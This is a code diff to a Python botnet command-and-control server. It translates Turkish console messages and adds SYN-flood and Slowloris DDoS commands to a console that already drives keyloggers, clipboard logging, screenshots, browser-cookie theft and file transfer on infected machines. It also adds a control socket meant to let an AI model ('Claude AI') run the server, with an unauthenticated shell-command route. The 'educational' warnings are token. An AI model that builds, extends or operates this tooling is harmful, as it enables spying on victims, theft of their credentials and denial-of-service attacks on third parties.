+                    print("  \033[96m•\033[0m ss start <ID>    - Start Screen Shots")
+                    print("  \033[96m•\033[0m ss stop <ID>     - Stop Screen Shots")
                     print("  \033[96m•\033[0m clearnet bots - Show Clearnet Connected Bots")
                     print("  \033[96m•\033[0m clear      - Clear Console")
                     print("  \033[96m•\033[0m stop <ID> - Closes the Bot")
                     print("  \033[96m•\033[0m exit       - Shutdown Server")
                     print("  --------------------------------------------------------")
-                    # AI/ML Commands : Disabled :(
+                    print("\033[95mAI and MCP Commands:\033[0m")
+                    print("  \033[96m•\033[0m mcp on   - Opens the MCP Connection")
+                    print("  \033[96m•\033[0m mcp off  - Closes the MCP Connection")
                     print("  --------------------------------------------------------")
                     print("\033[95mSecurity & P2P Commands:\033[0m")
                     print("  \033[96m•\033[0m security   - Show Security Rules Status")
                     print("  \033[96m•\033[0m p2p status - Show P2P Network Status")
-                    # AI-Powered P2P : Disabled :(
                     print("  \033[96m•\033[0m alerts     - Show Security Alerts")
                     print("  --------------------------------------------------------")
                     print("\033[95mWeb Dashboard Commands:\033[0m")
@@ -1264,10 +1337,6 @@ class C2Server:
                     print("  \033[96m•\033[0m network_maps - Show All Network Maps")
                     print("  \033[96m•\033[0m Example: network_map start bot-123 192.168.1.0/24")
                     print("  \033[96m•\033[0m Example: network_maps")
-                    print("  --------------------------------------------------------")
-                    # Bypass Techniques : Disabled :(
-                    print("\033[95mBypass Techniques:\033[0m")
-                    print("  \033[91m•\033[0m Coming Soon...\033[0m")
                     print("  --------------------------------------------------------")
                     print("\033[95mPersistence Systems:\033[0m")
                     print("  \033[91m•\033[0m ? - Coming Soon...\033[0m")
@@ -1315,7 +1384,7 @@ class C2Server:
                     if self.tor_enabled:
                         self.renew_tor_identity()
                     else:
-                        print("\033[91m[!] Tor modu aktif değil\033[0m")
+                        print("\033[93m[!] Tor mode is not active\033[0m")
                 
                 elif cmd == 'tor status':
                     print("\n\033[95mTor Status:\033[0m")
@@ -1324,7 +1393,7 @@ class C2Server:
                     print(f"  \033[96m•\033[0m Tor Port: \033[93m{self.tor_port}\033[0m")
                     print(f"  \033[96m•\033[0m SOCKS5 Proxy: \033[93m{'AVAILABLE' if SOCKS_AVAILABLE else 'NOT AVAILABLE'}\033[0m")
                     
-                    # Tor proxy durumu
+                    # Tor proxy status
                     if self.tor_enabled and SOCKS_AVAILABLE:
                         print(f"  \033[96m•\033[0m Command Routing: \033[92mVIA TOR\033[0m")
                     elif self.tor_enabled and not SOCKS_AVAILABLE:
@@ -1332,7 +1401,7 @@ class C2Server:
                     else:
                         print(f"  \033[96m•\033[0m Command Routing: \033[94mCLEARNET\033[0m")
                     
-                    # Tor üzerinden bağlanan botları say
+                    # Count bots connected via Tor
                     tor_bots = [bot_id for bot_id, bot in self.bots.items() 
                                if bot.get('tor_enabled', False)]
                     print(f"  \033[96m•\033[0m Tor Bots: \033[93m{len(tor_bots)}\033[0m")
@@ -1362,7 +1431,7 @@ class C2Server:
                     else:
                         print("\033[93m[!] No Tor bots connected\033[0m")
                 
-                # DNS Tunneling komutları
+                # DNS Tunneling commands
                 elif cmd.startswith('dns_tunnel '):
                     parts = cmd.split()
                     if len(parts) < 2:
@@ -1383,7 +1452,7 @@ class C2Server:
                         print(f"  \033[96m•\033[0m Port: \033[93m{self.dns_port}\033[0m")
                         print(f"  \033[96m•\033[0m dnslib: \033[93m{'AVAILABLE' if DNS_AVAILABLE else 'NOT AVAILABLE'}\033[0m")
                         
-                        # DNS Tunnel üzerinden bağlı botlar
+                        # DNS Tunnel bots connected
                         dns_bots = [bot_id for bot_id, bot in self.bots.items() 
                                    if bot.get('dns_tunnel', False)]
                         print(f"  \033[96m•\033[0m DNS Tunnel Bots: \033[93m{len(dns_bots)}\033[0m")
@@ -1420,9 +1489,9 @@ class C2Server:
                     bot_id = cmd.split()[1]
                     
                     if self.send_command(bot_id, f"smart_target {target_ip}"):
-                        print(f"\033[92m[+] Smart targeting başlatıldı: {bot_id} -> {target_ip}\033[0m")
+                        print(f"\033[92m[+] Smart targeting started: {bot_id} -> {target_ip}\033[0m")
                     else:
-                        print(f"\033[91m[!] Bot bulunamadı: {bot_id}\033[0m")
+                        print(f"\033[91m[!] Bot not found: {bot_id}\033[0m")
                 
                 elif cmd.startswith('ai evasion '):
                     print("\033[91m[!] 'ai evasion' command is disabled for safety\033[0m")
@@ -1432,24 +1501,24 @@ class C2Server:
                 elif cmd.startswith('copy start '):
                     bot_id = cmd.split()[-1]
                     if self.send_command(bot_id, "clipboard_start"):
-                        print(f"\033[92m[+] Clipboard logger başlatıldı: {bot_id}\033[0m")
+                        print(f"\033[92m[+] Clipboard logger started: {bot_id}\033[0m")
                         clipboard_file = f"clipboard_data/copy_{bot_id.replace('/', '_').replace('\\', '_')}.txt"
                         try:
                             with open(clipboard_file, "w", encoding="utf-8") as f:
                                 f.write(f"--- Clipboard logging started at {time.strftime('%Y-%m-%d %H:%M:%S')} ---\n")
-                            print(f"\033[92m[+] Clipboard log dosyası hazırlandı: {clipboard_file}\033[0m")
+                            print(f"\033[92m[+] Clipboard log file prepared: {clipboard_file}\033[0m")
                         except Exception as e:
-                            print(f"\033[91m[!] Clipboard dosyası hazırlanamadı: {e}\033[0m")
+                            print(f"\033[91m[!] Clipboard file preparation error: {e}\033[0m")
                     else:
-                        print(f"\033[91m[!] Bot bulunamadı: {bot_id}\033[0m")
+                        print(f"\033[91m[!] Bot not found: {bot_id}\033[0m")
                                 
                 
                 elif cmd.startswith('copy stop '):
                     bot_id = cmd.split()[-1]
                     if self.send_command(bot_id, "clipboard_stop"):
-                        print(f"\033[92m[+] Clipboard logger durduruldu: {bot_id}\033[0m")
+                        print(f"\033[92m[+] Clipboard logger stopped: {bot_id}\033[0m")
                     else:
-                        print(f"\033[91m[!] Bot bulunamadı: {bot_id}\033[0m")
+                        print(f"\033[91m[!] Bot not found: {bot_id}\033[0m")
                 
                 elif cmd.startswith('keylogger start '):
                     bot_id = cmd.split()[-1]
@@ -1534,6 +1603,108 @@ class C2Server:
                     except Exception as e:
                         print(f"\033[91m[!] DDoS command error: {e}\033[0m")
                 
+                elif cmd.startswith('ddos syn '):
+                    try:
+                        parts = cmd.split()
+                        if len(parts) < 4:
+                            print(f"\033[91m[!] Usage: ddos syn <bot_id> <target_ip> [--duration 30] [--threads 100]\033[0m")
+                            continue
+                        
+                        bot_id = parts[2]
+                        target_ip = parts[3]
+                        
+                        # Default values
+                        duration = 30
+                        threads = 100
+                        
+                        # Parse optional parameters
+                        i = 4
+                        while i < len(parts):
+                            if parts[i] == '--duration' and i + 1 < len(parts):
+                                duration = int(parts[i + 1])
+                                i += 2
+                            elif parts[i] == '--threads' and i + 1 < len(parts):
+                                threads = int(parts[i + 1])
+                                i += 2
+                            else:
+                                i += 1
+                        
+                        # Validate parameters
+                        if duration > 300:
+                            duration = 300
+                            print(f"\033[93m[!] Duration limited to 300 seconds\033[0m")
+                        
+                        if threads > 200:
+                            threads = 200
+                            print(f"\033[93m[!] Threads limited to 200 for SYN flood\033[0m")
+                        
+                        # Send command to bot
+                        ddos_command = f"ddos_syn|{target_ip}|80|{duration}|{threads}"
+                        if self.send_command(bot_id, ddos_command):
+                            print(f"\033[92m[+] SYN Flood attack started: {bot_id}\033[0m")
+                            print(f"\033[94m[*] Target: {target_ip}:80\033[0m")
+                            print(f"\033[94m[*] Duration: {duration} seconds\033[0m")
+                            print(f"\033[94m[*] Threads: {threads}\033[0m")
+                            print(f"\033[91m[!] WARNING: Use only for educational purposes!\033[0m")
+                        else:
+                            print(f"\033[91m[!] Bot not found: {bot_id}\033[0m")
+                            
+                    except ValueError:
+                        print(f"\033[91m[!] Invalid parameters. Use integers for duration and threads.\033[0m")
+                    except Exception as e:
+                        print(f"\033[91m[!] SYN Flood command error: {e}\033[0m")
+                
+                elif cmd.startswith('ddos slowloris '):
+                    try:
+                        parts = cmd.split()
+                        if len(parts) < 4:
+                            print(f"\033[91m[!] Usage: ddos slowloris <bot_id> <target_ip> [--duration 60] [--connections 100]\033[0m")
+                            continue
+                        
+                        bot_id = parts[2]
+                        target_ip = parts[3]
+                        
+                        # Default values
+                        duration = 60
+                        connections = 100
+                        
+                        # Parse optional parameters
+                        i = 4
+                        while i < len(parts):
+                            if parts[i] == '--duration' and i + 1 < len(parts):
+                                duration = int(parts[i + 1])
+                                i += 2
+                            elif parts[i] == '--connections' and i + 1 < len(parts):
+                                connections = int(parts[i + 1])
+                                i += 2
+                            else:
+                                i += 1
+                        
+                        # Validate parameters
+                        if duration > 300:
+                            duration = 300
+                            print(f"\033[93m[!] Duration limited to 300 seconds\033[0m")
+                        
+                        if connections > 500:
+                            connections = 500
+                            print(f"\033[93m[!] Connections limited to 500 for Slowloris\033[0m")
+                        
+                        # Send command to bot
+                        ddos_command = f"ddos_slowloris|{target_ip}|80|{duration}|{connections}"
+                        if self.send_command(bot_id, ddos_command):
+                            print(f"\033[92m[+] Slowloris attack started: {bot_id}\033[0m")
+                            print(f"\033[94m[*] Target: {target_ip}:80\033[0m")
+                            print(f"\033[94m[*] Duration: {duration} seconds\033[0m")
+                            print(f"\033[94m[*] Connections: {connections}\033[0m")
+                            print(f"\033[91m[!] WARNING: Use only for educational purposes!\033[0m")
+                        else:
+                            print(f"\033[91m[!] Bot not found: {bot_id}\033[0m")
+                            
+                    except ValueError:
+                        print(f"\033[91m[!] Invalid parameters. Use integers for duration and connections.\033[0m")
+                    except Exception as e:
+                        print(f"\033[91m[!] Slowloris command error: {e}\033[0m")
+                
                 elif cmd.startswith('ddos stop '):
                     bot_id = cmd.split()[-1]
                     if self.send_command(bot_id, "ddos_stop"):
@@ -1544,9 +1715,9 @@ class C2Server:
                 elif cmd.startswith('cookies '):
                     bot_id = cmd.split(maxsplit=1)[1]
                     if self.send_command(bot_id, "get_cookies"):
-                        print(f"\033[92m[+] Cookie talep gönderildi: {bot_id}\033[0m")
+                        print(f"\033[92m[+] Cookie request sent: {bot_id}\033[0m")
                     else:
-                        print(f"\033[91m[!] Bot bulunamadı: {bot_id}\033[0m")
+                        print(f"\033[91m[!] Bot not found: {bot_id}\033[0m")
                     
                 elif cmd.startswith('upload '):
                     parts = cmd.split(maxsplit=2)
@@ -1556,7 +1727,7 @@ class C2Server:
                     bot_id = parts[1]
                     file_path = parts[2]
                     if not os.path.exists(file_path):
-                        print(f"\033[91m[!] Dosya bulunamadı: {file_path}\033[0m")
+                        print(f"Error: File not found: {file_path}")
                         continue
                     try:
                         with open(file_path, 'rb') as f:
@@ -1569,9 +1740,9 @@ class C2Server:
                             'action': 'file_upload',
                             'silent': True
                         })
-                        print(f"\033[92m[+] Dosya yükleme komutu gönderildi: {bot_id}\033[0m")
+                        print(f"\033[92m[+] File upload command queued for {bot_id}: {remote_name}\033[0m")
                     except Exception as e:
-                        print(f"\033[91m[!] Dosya okuma hatası: {e}\033[0m")
+                        print(f"\033[91m[!] File read error: {e}\033[0m")
                 
                 elif cmd.startswith('download '):
                     parts = cmd.split(maxsplit=2)
@@ -1582,30 +1753,30 @@ class C2Server:
                     bot_id = parts[1]
                     remote_path = parts[2]
                     
-                    # Downloads dizini oluştur
+                    # Create downloads directory
                     downloads_dir = f"downloads/{bot_id}"
                     os.makedirs(downloads_dir, exist_ok=True)
                     
                     if self.send_command(bot_id, f"file_download {remote_path}"):
-                        print(f"\033[92m[+] Dosya indirme komutu gönderildi: {bot_id}\033[0m")
-                        print(f"\033[94m[*] Hedef dizin: {remote_path}\033[0m")
-                        print(f"\033[94m[*] İndirilecek yer: {downloads_dir}\033[0m")
+                        print(f"\033[92m[+] File download command sent: {bot_id}\033[0m")
+                        print(f"\033[94m[*] Target directory: {remote_path}\033[0m")
+                        print(f"\033[94m[*] Download location: {downloads_dir}\033[0m")
                     else:
-                        print(f"\033[91m[!] Bot bulunamadı: {bot_id}\033[0m")
+                        print(f"\033[91m[!] Bot not found: {bot_id}\033[0m")
                 
                 elif cmd.startswith('keylogger start '):
                     bot_id = cmd.split()[-1]
                     if self.send_command(bot_id, "keylogger_start"):
-                        print(f"\033[92m[+] Keylogger başlatıldı: {bot_id}\033[0m")
+                        print(f"\033[92m[+] Keylogger started: {bot_id}\033[0m")
                     else:
-                        print(f"\033[91m[!] Bot bulunamadı: {bot_id}\033[0m")
+                        print(f"\033[91m[!] Bot not found: {bot_id}\033[0m")
                 
                 elif cmd.startswith('keylogger stop '):
                     bot_id = cmd.split()[-1]
                     if self.send_command(bot_id, "keylogger_stop"):
-                        print(f"\033[92m[+] Keylogger durduruldu: {bot_id}\033[0m")
+                        print(f"\033[92m[+] Keylogger stopped: {bot_id}\033[0m")
                     else:
-                        print(f"\033[91m[!] Bot bulunamadı: {bot_id}\033[0m")
+                        print(f"\033[91m[!] Bot not found: {bot_id}\033[0m")
                 
                 elif cmd.startswith('network_map '):
                     parts = cmd.split()
@@ -1616,22 +1787,22 @@ class C2Server:
                         if action == 'start':
                             scope = parts[3] if len(parts) > 3 else '192.168.1.0/24'
                             if self.send_command(bot_id, f"network_map_start {scope}"):
-                                print(f"\033[92m[+] Network mapping başlatıldı: {bot_id} - {scope}\033[0m")
-                                print(f"\033[94m[*] Cihaz adı, MAC, IP ve servis bilgileri toplanıyor...\033[0m")
+                                print(f"\033[92m[+] Network mapping started: {bot_id} - {scope}\033[0m")
+                                print(f"\033[94m[*] Collecting device name, MAC, IP and service information...\033[0m")
                             else:
-                                print(f"\033[91m[!] Bot bulunamadı: {bot_id}\033[0m")
+                                print(f"\033[91m[!] Bot not found: {bot_id}\033[0m")
                         
                         elif action == 'status':
                             if self.send_command(bot_id, "network_map_status"):
-                                print(f"\033[92m[+] Network mapping durumu sorgulanıyor: {bot_id}\033[0m")
+                                print(f"\033[92m[+] Network mapping status queried: {bot_id}\033[0m")
                             else:
-                                print(f"\033[91m[!] Bot bulunamadı: {bot_id}\033[0m")
+                                print(f"\033[91m[!] Bot not found: {bot_id}\033[0m")
                         
                         elif action == 'stop':
                             if self.send_command(bot_id, "network_map_stop"):
-                                print(f"\033[92m[+] Network mapping durduruldu: {bot_id}\033[0m")
+                                print(f"\033[92m[+] Network mapping stopped: {bot_id}\033[0m")
                             else:
-                                print(f"\033[91m[!] Bot bulunamadı: {bot_id}\033[0m")
+                                print(f"\033[91m[!] Bot not found: {bot_id}\033[0m")
                         
                         else:
                             self._show_command_help('network_map')
@@ -1702,7 +1873,7 @@ class C2Server:
                     print("\033[91m[!] Copy status functionality DISABLED for safety\033[0m")
                     print("\033[91m[!] System replication has been removed from the bot\033[0m")
                 
-                # AI-P2P komutları kaldırıldı
+                # AI-P2P commands removed
                 
                 # ==================== CMD COMMAND SYSTEM ====================
                 elif cmd.startswith('cmd '):
@@ -1714,7 +1885,7 @@ class C2Server:
                     bot_id = parts[1]
                     command = parts[2]
                     
-                    # Komut validasyonu
+                    # Command validation
                     allowed_commands = ['whoami', 'ls', 'pwd', 'isvm', 'sysinfo', 'screenshot', 'keylogger']
                     
                     if command.split()[0] not in allowed_commands:
@@ -1732,6 +1903,40 @@ class C2Server:
                     self.active = False
                     print("\033[91m[!] Shutting down server...\033[0m")
                     os._exit(0)
+                
+                elif cmd == 'mcp on':
+                    if self.mcp_enabled:
+                        print("\033[93m[!] MCP server is already running\033[0m")
+                    else:
+                        try:
+                            if self.start_mcp_control_server():
+                                self.mcp_enabled = True
+                                print("\033[92m[+] MCP server started\033[0m")
+                                print("\033[94m[*] Claude AI can now manage this C2 server\033[0m")
+                                print("\033[94m[*] MCP control server running on port 5001\033[0m")
+                            else:
+                                print("\033[91m[!] Failed to start MCP server\033[0m")
+                        except Exception as e:
+                            print(f"\033[91m[!] MCP server start error: {e}\033[0m")
+                
+                elif cmd == 'mcp off':
+                    if not self.mcp_enabled:
+                        print("\033[93m[!] MCP server is not running\033[0m")
+                    else:
+                        try:
+                            if self.mcp_server:
+                                self.mcp_server.stop()
+                            self.mcp_enabled = False
+                            self.mcp_server = None
+                            print("\033[92m[+] MCP server stopped\033[0m")
+                        except Exception as e:
+                            print(f"\033[91m[!] MCP server stop error: {e}\033[0m")
+                
+                elif cmd == 'mcp status':
+                    print("\n\033[95mMCP Server Status:\033[0m")
+                    print(f"  \033[96m•\033[0m Status: \033[93m{'RUNNING' if self.mcp_enabled else 'STOPPED'}\033[0m")
+                    print(f"  \033[96m•\033[0m Claude AI: \033[93m{'CONNECTED' if self.mcp_enabled else 'DISCONNECTED'}\033[0m")
+                    print("\n\033[95mMCP Status:\033[0m \033[94mMONITORING\033[0m\n")
                     
                 else:
                     print("\033[91m[!] Unknown command. Type 'help' for options\033[0m")
@@ -1759,7 +1964,7 @@ class C2Server:
                     break
 
     def start_web_dashboard(self):
-        """Web dashboard'u başlatır"""
+        """Start the web dashboard"""
         if not WEB_DASHBOARD_AVAILABLE:
             print("\033[91m[!] Flask not installed. Install with: pip install flask\033[0m")
             return False
@@ -1784,7 +1989,7 @@ class C2Server:
             return False
     
     def stop_web_dashboard(self):
-        """Web dashboard'u durdurur"""
+        """Stop the web dashboard"""
         if not self.web_dashboard_enabled:
             print("\033[93m[!] Web dashboard not running\033[0m")
             return False
@@ -1797,10 +2002,735 @@ class C2Server:
             print(f"\033[91m[!] Web dashboard stop error: {e}\033[0m")
             return False
     
-    def _init_vuln_scanner(self):
-        """Vulnerability Scanner sistemini başlatır"""
+    def start_mcp_control_server(self):
+        """Start MCP control server for socket communication"""
         try:
-            # Vulnerability Scanner mesajını kaldırdık
+            import socket
+            import threading
+            import json
+            
+            mcp_port = 5001
+            control_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            control_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            control_socket.bind(('0.0.0.0', mcp_port))
+            control_socket.listen(5)
+            
+            def handle_mcp_command(client):
+                """Handle MCP commands"""
+                try:
+                    data = client.recv(4096).decode()
+                    request = json.loads(data)
+                    command = request.get('command', '')
+                    
+                    # Execute command
+                    result = self.execute_command_for_mcp(command)
+                    
+                    # Send result
+                    response = json.dumps({'result': result})
+                    client.send(response.encode())
+                except Exception as e:
+                    error_response = json.dumps({'error': str(e)})
+                    client.send(error_response.encode())
+                finally:
+                    client.close()
+            
+            def run_mcp_server():
+                """Run MCP control server"""
+                print(f"\033[92m[+] MCP control server started on port {mcp_port}\033[0m")
+                while self.active:
+                    try:
+                        client, addr = control_socket.accept()
+                        threading.Thread(target=handle_mcp_command, args=(client,)).start()
+                    except:
+                        break
+            
+            # Start MCP control server in separate thread
+            mcp_thread = threading.Thread(target=run_mcp_server, daemon=True)
+            mcp_thread.start()
+            
+            return True
+        except Exception as e:
+            print(f"\033[91m[!] MCP control server start error: {e}\033[0m")
+            return False
+    
+    def execute_command_for_mcp(self, command):
+        """Execute command for MCP - returns rich output matching admin_console"""
+        import io
+        import sys
+        
+        parts = command.strip().split()
+        main_cmd = parts[0] if parts else ''
+        
+        # Capture print output to match admin_console behavior
+        old_stdout = sys.stdout
+        sys.stdout = captured_output = io.StringIO()
+        
+        try:
+            if main_cmd == 'list':
+                with self.lock:
+                    if not self.bots:
+                        print("[!] No active bots")
+                    else:
+                        print("\nActive Bots:")
+                        for bot_id, bot in self.bots.items():
+                            p2p_status = self.p2p_status.get(bot_id, {}).get('status', 'unknown')
+                            has_alert = bot_id in self.wireshark_alerts
+                            
+                            p2p_icon = "Active" if p2p_status == 'active' else "Stopped" if p2p_status == 'stopped' else "Unknown"
+                            alert_icon = "Alert" if has_alert else "Clean"
+                            
+                            print(f"  - {bot_id} ({bot['ip']})")
+                            print(f"    Last seen: {time.ctime(bot['last_seen'])}")
+                            print(f"    P2P Status: {p2p_icon}")
+                            print(f"    Security: {alert_icon}")
+                            print()
+            
+            elif main_cmd == 'server':
+                print("\nServer Information:")
+                print(f"  Host: {self.host}")
+                print(f"  Port: {self.port}")
+                print(f"  Encryption: AES-256-CBC")
+                print(f"  Active Bots: {len(self.bots)}")
+                print(f"  Server Status: ACTIVE")
+                print()
+                
+            elif main_cmd == 'status':
+                total = len(self.bots)
+                active = sum(1 for b in self.bots.values() if b.get('active', False))
+                print(f"Total bots: {total}")
+                print(f"Active: {active}")
+                print(f"Offline: {total-active}")
+                
+            elif main_cmd == 'info':
+                if len(parts) < 2:
+                    print("Usage: info <bot_id>")
+                else:
+                    bot_id = parts[1]
+                    if bot_id not in self.bots:
+                        print(f"Bot not found: {bot_id}")
+                    else:
+                        info = self.bots[bot_id]
+                        print(f"=== {bot_id.upper()} ===")
+                        print(f"IP: {info.get('ip', 'N/A')}")
+                        print(f"OS: {info.get('os', 'N/A')}")
+                        print(f"Platform: {info.get('platform', 'Unknown')}")
+                        print(f"Status: {'Active' if info.get('active', False) else 'Inactive'}")
+                        print(f"Last seen: {time.ctime(info.get('last_seen', 0))}")
+            
+            elif main_cmd == 'terminal':
+                if len(parts) < 2:
+                    print("Usage: terminal <command>")
+                else:
+                    terminal_cmd = ' '.join(parts[1:])
+                    try:
+                        import subprocess
+                        result = subprocess.run(terminal_cmd, shell=True, capture_output=True, text=True, timeout=30)
+                        output = result.stdout if result.stdout else result.stderr
+                        print("=== TERMINAL OUTPUT ===")
+                        print(f"Command: {terminal_cmd}")
+                        print()
+                        print(output)
+                    except Exception as e:
+                        print(f"Terminal error: {str(e)}")
+            
+            elif main_cmd == 'bot_cmd':
+                if len(parts) < 3:
+                    print("Usage: bot_cmd <bot_id> <command>")
+                else:
+                    bot_id = parts[1]
+                    bot_command = ' '.join(parts[2:])
+                    
+                    if bot_id not in self.bots:
+                        print(f"Bot not found: {bot_id}")
+                    else:
+                        try:
+                            # Create a response storage for this command
+                            import threading
+                            command_response = {'output': None, 'event': threading.Event()}
+                            
+                            # Store pending response
+                            if not hasattr(self, '_mcp_pending_responses'):
+                                self._mcp_pending_responses = {}
+                            self._mcp_pending_responses[bot_id] = command_response
+                            
+                            # Send command
+                            result = self.send_command(bot_id, bot_command)
+                            print(f"Command sent to {bot_id}: {bot_command}")
+                            print("Waiting for response...")
+                            
+                            # Wait for response (max 10 seconds)
+                            command_response['event'].wait(timeout=10)
+                            
+                            # Get output
+                            output = command_response.get('output', 'No response received')
+                            print(f"Response: {output}")
+                            
+                            # Cleanup
+                            self._mcp_pending_responses.pop(bot_id, None)
+                            
+                        except Exception as e:
+                            print(f"Bot command error: {str(e)}")
+            
+            elif main_cmd == 'help':
+                print("""=== AVAILABLE COMMANDS ===
+Bot Management:
+  list              - Show connected bots
+  info <bot_id>     - Show bot details
+  stop <bot_id>     - Stop/kill a bot
+  cmd <bot_id> <command> - Send command to bot
+  broadcast <command> - Send command to all bots
+  processes <bot_id> - Show running processes
+  upload <bot_id> <file> - Upload file to bot
+  download <bot_id> <path> - Download file from bot
+  cookies <bot_id>  - Steal browser cookies
+
+Server Info:
+  server            - Show server information
+  status            - Show bot count
+  security          - Show security rules status
+  p2p status        - Show P2P network status
+  alerts            - Show security alerts
+  web status        - Show web dashboard status
+
+Tor Management:
+  tor enable        - Start Tor service
+  tor disable       - Stop Tor service
+  tor renew         - Renew Tor identity
+  tor status        - Show Tor status
+  tor bots          - List Tor-connected bots
+  clearnet bots     - List clearnet bots
+
+Web Dashboard:
+  web start         - Start web dashboard
+  web stop          - Stop web dashboard
+
+Show Commands:
+  show exploits     - Show exploit database
+  show stats        - Show system statistics
+  show logs         - Show system logs
+  show config       - Show configuration
+  show history      - Show command history
+  show files        - Show file system info
+  show network      - Show network information
+
+Bot Features:
+  keylogger start/stop <bot_id> - Keylogger control
+  copy start/stop <bot_id> - Clipboard logger control
+  ss start/stop <bot_id> - Screenshot capture control
+
+Network Mapping:
+  network_map start/stop/status <bot_id> [scope]
+  network_maps      - Show all network maps
+
+DNS Tunnel:
+  dns_tunnel enable/disable/status
+
+DDoS (Educational):
+  ddos start <bot_id> <target_ip> [--duration 30] [--threads 50]
+  ddos stop <bot_id>
+
+Other:
+  clear             - Clear screen
+  terminal <cmd>    - Run local terminal command
+  help              - This message""")
+            
+            elif main_cmd == 'stop' and len(parts) > 1:
+                bot_id = parts[1]
+                if bot_id in self.bots:
+                    if self.send_command(bot_id, 'stop'):
+                        print(f"[+] Stop command sent to {bot_id}")
+                    else:
+                        print(f"[!] Failed to send stop command")
+                else:
+                    print(f"[!] Bot not found: {bot_id}")
+            
+            elif main_cmd == 'security':
+                print("\nSecurity Rules Status:")
+                print(f"  Security Rules: {'ENABLED' if self.security_rules_enabled else 'DISABLED'}")
+                print(f"  Rule #1: C2 Connected -> P2P OFF")
+                print(f"  Rule #2: Wireshark Detected -> C2 + P2P OFF")
+                print(f"  Rule #3: C2 Failed + No Wireshark -> P2P ON")
+                with self.lock:
+                    active_alerts = len(self.wireshark_alerts)
+                    active_p2p = len([s for s in self.p2p_status.values() if s.get('status') == 'active'])
+                print(f"  Active Security Alerts: {active_alerts}")
+                print(f"  Active P2P Networks: {active_p2p}")
+                print("\nSecurity Status: PROTECTED")
+            
+            elif main_cmd == 'p2p' and len(parts) > 1 and parts[1] == 'status':
+                print("\nP2P Network Status:")
+                with self.lock:
+                    if not self.p2p_status:
+                        print("  [!] No P2P activity detected")
+                    else:
+                        for bot_id, status_info in self.p2p_status.items():
+                            status = status_info['status']
+                            timestamp = time.ctime(status_info['timestamp'])
+                            print(f"  - {bot_id}: {status} ({timestamp})")
+                print(f"  P2P Port Range: {self.p2p_port_range}")
+                print(f"  IPv6 Support: {'Enabled' if self.ipv6_enabled else 'Disabled'}")
+            
+            elif main_cmd == 'alerts':
+                print("\nSecurity Alerts:")
+                with self.lock:
+                    if not self.wireshark_alerts and not hasattr(self, 'security_alerts'):
+                        print("  [+] No security alerts")
+                    else:
+                        if self.wireshark_alerts:
+                            print("  [*] Wireshark Alerts:")
+                            for bot_id, alert_info in self.wireshark_alerts.items():
+                                print(f"    - {bot_id}: {alert_info['message']}")
+                        if hasattr(self, 'security_alerts') and self.security_alerts:
+                            print("  [*] Security Alerts:")
+                            for bot_id, alert_info in self.security_alerts.items():
+                                print(f"    - {bot_id}: {alert_info['message']}")
+            
+            elif main_cmd == 'tor':
+                if len(parts) > 1:
+                    tor_cmd = parts[1]
+                    if tor_cmd == 'enable':
+                        if not self.tor_process:
+                            if self.start_tor():
+                                print("[+] Tor service started successfully")
+                            else:
+                                print("[!] Failed to start Tor service")
+                        else:
+                            print("[!] Tor service is already running")
+                    elif tor_cmd == 'disable':
+                        if self.tor_process:
+                            if self.stop_tor():
+                                print("[+] Tor service stopped successfully")
+                            else:
+                                print("[!] Failed to stop Tor service")
+                        else:
+                            print("[!] Tor service is not running")
+                    elif tor_cmd == 'renew':
+                        if self.tor_enabled:
+                            self.renew_tor_identity()
+                            print("[+] Tor identity renewed")
+                        else:
+                            print("[!] Tor mode is not active")
+                    elif tor_cmd == 'status':
+                        print(f"\nTor Status:")
+                        print(f"  Tor Enabled: {'YES' if self.tor_enabled else 'NO'}")
+                        print(f"  Tor Process: {'RUNNING' if self.tor_process else 'STOPPED'}")
+                        tor_bots = [b for b in self.bots.items() if b[1].get('tor_enabled', False)]
+                        print(f"  Tor Bots: {len(tor_bots)}")
+                    elif tor_cmd == 'bots':
+                        tor_bots = [b for b in self.bots.items() if b[1].get('tor_enabled', False)]
+                        if tor_bots:
+                            print("\nTor Connected Bots:")
+                            for bot_id, bot in tor_bots:
+                                print(f"  - {bot_id} ({bot['ip']})")
+                        else:
+                            print("[!] No Tor bots connected")
+                    else:
+                        print(f"Unknown tor command: {tor_cmd}")
+                else:
+                    print("Usage: tor <enable|disable|renew|status|bots>")
+            
+            elif main_cmd == 'clearnet' and len(parts) > 1 and parts[1] == 'bots':
+                clearnet_bots = [b for b in self.bots.items() if not b[1].get('tor_enabled', False)]
+                if clearnet_bots:
+                    print("\nClearnet Connected Bots:")
+                    for bot_id, bot in clearnet_bots:
+                        print(f"  - {bot_id} ({bot['ip']})")
+                else:
+                    print("[!] No clearnet bots connected")
+            
+            elif main_cmd == 'web':
+                if len(parts) > 1:
+                    web_cmd = parts[1]
+                    if web_cmd == 'start':
+                        if self.start_web_dashboard():
+                            print("[+] Web dashboard started successfully")
+                        else:
+                            print("[!] Failed to start web dashboard")
+                    elif web_cmd == 'stop':
+                        if self.stop_web_dashboard():
+                            print("[+] Web dashboard stopped successfully")
+                        else:
+                            print("[!] Failed to stop web dashboard")
+                    elif web_cmd == 'status':
+                        print(f"\nWeb Dashboard Status:")
+                        print(f"  Status: {'RUNNING' if self.web_dashboard_enabled else 'STOPPED'}")
+                        print(f"  Host: {self.web_dashboard_host}")
+                        print(f"  Port: {self.web_dashboard_port}")
+                else:
+                    print("Usage: web <start|stop|status>")
+            
+            elif main_cmd == 'show':
+                if len(parts) > 1:
+                    show_cmd = parts[1]
+                    if show_cmd == 'exploits':
+                        self._show_exploits()
+                    elif show_cmd == 'stats':
+                        self._show_stats()
+                    elif show_cmd == 'logs':
+                        self._show_logs()
+                    elif show_cmd == 'config':
+                        self._show_config()
+                    elif show_cmd == 'history':
+                        self._show_history()
+                    elif show_cmd == 'files':
+                        self._show_files()
+                    elif show_cmd == 'network':
+                        self._show_network()
+                    else:
+                        print(f"Unknown show command: {show_cmd}")
+                else:
+                    print("Usage: show <exploits|stats|logs|config|history|files|network>")
+            
+            elif main_cmd == 'processes' and len(parts) > 1:
+                bot_id = parts[1]
+                if bot_id in self.bots:
+                    self._pending_processes_command = {'bot_id': bot_id}
+                    if self.send_command(bot_id, 'processes'):
+                        print(f"[*] Requesting process information from {bot_id}...")
+                    else:
+                        print(f"[!] Failed to send command")
+                        self._pending_processes_command = None
+                else:
+                    print(f"[!] Bot not found: {bot_id}")
+            
+            elif main_cmd == 'cmd' and len(parts) > 2:
+                bot_id = parts[1]
+                bot_cmd = ' '.join(parts[2:])
+                if bot_id in self.bots:
+                    try:
+                        import threading
